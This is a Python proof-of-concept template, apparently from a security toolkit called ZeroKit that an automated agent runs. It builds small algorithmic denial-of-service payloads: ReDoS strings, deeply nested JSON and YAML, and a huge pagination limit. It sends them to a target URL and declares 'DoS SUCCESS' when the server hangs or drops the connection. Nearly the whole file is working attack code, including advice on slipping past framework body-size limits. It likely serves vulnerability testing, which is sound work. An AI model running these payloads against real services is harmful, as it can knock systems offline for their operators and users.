"""
ZeroKit Algorithmic Complexity / ReDoS PoC Template
====================================================
Use this template for:
  - ReDoS (Catastrophic Regex Backtracking)
  - Deeply nested JSON/YAML/XML (parser complexity)
  - Hash-collision flooding
  - Pagination/query-amplification abuse (large `limit` param)

WHY NOT a large body?
  Modern framework middlewares (Kestrel MaxRequestBodySize, Spring maxHttpFormPostSize,
  Express body-parser limit) silently reject bodies > their configured limit
  BEFORE the application code ever runs. The server stays alive and healthy.
  A 16 MB payload proves nothing — Kestrel drops it in < 1ms.

  Algorithmic DoS works differently: the payload is TINY (usually < 50 KB) but
  forces the server's CPU/memory into exponential-time work.

HARD LIMIT: PAYLOAD_BYTES must be < 50 KB.
  If your chosen payload exceeds 50 KB, redesign it — it will not reach app code.

Variables to fill:
    TARGET_URL      - The endpoint to attack.
    PAYLOAD_TYPE    - "redos" | "nested_json" | "nested_yaml" | "pagination"
    ENDPOINT_PARAM  - Request parameter that carries the payload (e.g. "q", "data", "limit")
    METHOD          - "GET" | "POST"
    DOS_TIMEOUT     - Seconds to wait before declaring success. Default: 15.
"""

import json
import sys
import time
import threading

import requests

# ── Configuration ─────────────────────────────────────────────────────────────
TARGET_URL      = "{{TARGET_URL}}"
PAYLOAD_TYPE    = "{{PAYLOAD_TYPE}}"  # "redos" | "nested_json" | "nested_yaml" | "pagination"
ENDPOINT_PARAM  = "{{ENDPOINT_PARAM}}"
METHOD          = "POST"
DOS_TIMEOUT     = 15   # seconds — time Agent waits before declaring success


# ── Payload generators (all < 50 KB) ─────────────────────────────────────────

def build_redos_payload() -> str:
    """
    ReDoS via catastrophic backtracking.
    Classic: (a+)+ against a string of 'a's followed by 'X'.
    Tune `repeat` to stay under 50 KB while still triggering exponential runtime.
    """
    return "a" * 50_000 + "!"  # ~49 KB, safe boundary


def build_nested_json_payload(depth: int = 1000) -> bytes:
    """
    Deeply nested JSON object — forces recursive descent parser to allocate
    O(depth) stack frames. Most JSON parsers have no built-in depth limit.
    Payload stays tiny even at depth=10000.
    """
    obj = "x"
    for _ in range(depth):
        obj = '{"k":' + obj + '}'
    payload = obj.encode()
    size_kb = len(payload) / 1024
    print(f"[*] Nested JSON payload: depth={depth}, size={size_kb:.1f} KB")
    assert size_kb < 50, f"Payload too large ({size_kb:.1f} KB) — will be blocked by middleware"
    return payload


def build_nested_yaml_payload(depth: int = 200) -> str:
    """
    Deeply nested YAML — YAML parsers (Ruby, PyYAML, SnakeYAML) are especially
    vulnerable to exponential anchor/alias expansion.
    """
    lines = []
    for i in range(depth):
        lines.append("  " * i + "a:")
    lines.append("  " * depth + "z")
    return "\n".join(lines)


def build_pagination_payload() -> dict:
    """
    Pagination amplification: request all records in one shot.
    Target: endpoints with user-controlled `page_size` / `limit` / `per_page`.
    """
    return {ENDPOINT_PARAM: 999_999_999}


# ── Baseline check ────────────────────────────────────────────────────────────
def baseline_ok() -> bool:
    try:
        r = requests.get(TARGET_URL, timeout=10)
        print(f"[*] Baseline OK — HTTP {r.status_code}")
        return True
    except Exception as e:
        print(f"[!] Baseline failed: {e}")
        return False


# ── Send payload ──────────────────────────────────────────────────────────────
def send_payload(payload_bytes, content_type: str) -> bool:
    """
    Returns True  → Timeout / ConnectionError (DoS confirmed, exit 0)
    Returns False → Server responded normally (not vulnerable, exit 1)
    """
    t0 = time.monotonic()
    try:
        if METHOD == "GET":
            requests.get(TARGET_URL, params={ENDPOINT_PARAM: payload_bytes},
                         timeout=DOS_TIMEOUT)
        else:
            requests.post(TARGET_URL, data=payload_bytes,
                          headers={"Content-Type": content_type},
                          timeout=DOS_TIMEOUT)
        elapsed = time.monotonic() - t0
        print(f"[-] Server responded in {elapsed:.2f}s — not vulnerable.")
        return False

    except requests.exceptions.Timeout:
        elapsed = time.monotonic() - t0
        print(f"[+] DoS SUCCESS: server hung for {elapsed:.1f}s — CPU/memory exhaustion confirmed.")
        return True

    except requests.exceptions.ConnectionError as e:
        elapsed = time.monotonic() - t0
        print(f"[+] DoS SUCCESS: connection dropped after {elapsed:.1f}s — server may have crashed: {e}")
        return True

    except Exception as e:
        print(f"[-] Unexpected error (inconclusive): {e}")
        return False


# ── Benign baseline payload (same structure, safe size) ───────────────────────
def build_benign_payload(payload_type: str) -> bytes:
    """
    A 'safe' version of the payload with the SAME structure but only 2 levels deep.
    Used to measure baseline response time so we can prove degeneracy is input-driven,
    not a network fluke.
    """
    if payload_type == "redos":
        return b"aaa"            # trivial string, no backtracking
    elif payload_type == "nested_json":
        return build_nested_json_payload(depth=5)   # harmless depth
    elif payload_type == "nested_yaml":
        return build_nested_yaml_payload(depth=3).encode()
    elif payload_type == "pagination":
        return json.dumps({ENDPOINT_PARAM: 10}).encode()   # small page
    return b"test"


def measure_response_time(raw_payload: bytes, content_type: str, label: str) -> float:
    """
    Send the payload, return response time in seconds.
    Returns DOS_TIMEOUT if request timed out (server hung).
    Returns -1.0 on connection failure (also counts as success for DoS).
    """
    t0 = time.monotonic()
    try:
        if METHOD == "GET":
            requests.get(TARGET_URL, params={ENDPOINT_PARAM: raw_payload},
                         timeout=DOS_TIMEOUT)
        else:
            requests.post(TARGET_URL, data=raw_payload,
                          headers={"Content-Type": content_type},
                          timeout=DOS_TIMEOUT)
        elapsed = time.monotonic() - t0
        print(f"[*] {label}: responded in {elapsed:.3f}s")
        return elapsed

    except requests.exceptions.Timeout:
        elapsed = time.monotonic() - t0
        print(f"[!] {label}: TIMEOUT after {elapsed:.1f}s")
        return DOS_TIMEOUT   # treat full timeout as worst-case

    except requests.exceptions.ConnectionError as e:
        elapsed = time.monotonic() - t0
        print(f"[!] {label}: CONNECTION DROPPED after {elapsed:.1f}s ({e})")
        return -1.0   # connection failure == server may have crashed


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # ── Validate payload size before sending ──
    if not baseline_ok():
        print("[-] Aborting — server already unreachable.")
        sys.exit(2)

    print(f"[*] Payload type: {PAYLOAD_TYPE}")

    if PAYLOAD_TYPE == "redos":
        attack_raw  = build_redos_payload().encode()
        ctype       = "text/plain"
    elif PAYLOAD_TYPE == "nested_json":
        attack_raw  = build_nested_json_payload(depth=1000)
        ctype       = "application/json"
    elif PAYLOAD_TYPE == "nested_yaml":
        attack_raw  = build_nested_yaml_payload(depth=200).encode()
        ctype       = "text/yaml"
    elif PAYLOAD_TYPE == "pagination":
        attack_raw  = json.dumps(build_pagination_payload()).encode()
        ctype       = "application/json"
    else:
        print(f"[-] Unknown PAYLOAD_TYPE '{PAYLOAD_TYPE}'. Aborting.")
        sys.exit(2)

    # ── Hard size guard ──
    size_kb = len(attack_raw) / 1024
    print(f"[*] Attack payload size: {size_kb:.1f} KB")
    if size_kb > 50:
        print(f"[!] ABORT: Payload is {size_kb:.1f} KB — exceeds the 50 KB protocol budget.")
        print("[!] This payload will be rejected by middleware before reaching application code.")
        print("[!] Redesign using algorithmic complexity, not raw size.")
        sys.exit(2)

    # ── Step A: Measure benign baseline ──
    benign_raw   = build_benign_payload(PAYLOAD_TYPE)
    baseline_t   = measure_response_time(benign_raw, ctype, "Benign baseline")
    if baseline_t < 0:
        print("[-] Server crashed on benign payload — environment issue, inconclusive.")
        sys.exit(2)

    # ── Step B: Measure attack payload ──
    attack_t = measure_response_time(attack_raw, ctype, "Attack payload")

    # ── Step C: Time-ratio confirmation (Workflow 6 Step 5) ──
    # A genuine Algorithmic Degeneracy will show attack_t >> baseline_t
    # even when payload sizes are similar. This proves cost is input-driven.
    print(f"\n[*] Ratio: attack_time / baseline_time = {attack_t:.3f}s / {baseline_t:.3f}s")

    if attack_t < 0:
        # Connection dropped mid-attack = server crash
        print("[+] DoS SUCCESS: server connection dropped under attack payload.")
        print("[+] Algorithmic degeneracy CONFIRMED (server crash / OOM).")
        sys.exit(0)

    if baseline_t > 0 and attack_t / baseline_t >= 10:
        print(f"[+] DoS SUCCESS: attack took {attack_t/baseline_t:.0f}× longer than benign.")
        print("[+] Algorithmic degeneracy CONFIRMED — attacker controls runtime cost.")
        sys.exit(0)

    if attack_t >= DOS_TIMEOUT:
        print(f"[+] DoS SUCCESS: server timed out on attack payload (>{DOS_TIMEOUT}s).")
        print("[+] Algorithmic degeneracy CONFIRMED.")
        sys.exit(0)

    print(f"[-] NOT confirmed: ratio {attack_t/max(baseline_t,0.001):.1f}× — below threshold of 10×.")
    print("[-] Attack payload did not cause significant algorithmic degeneracy.")
    sys.exit(1)

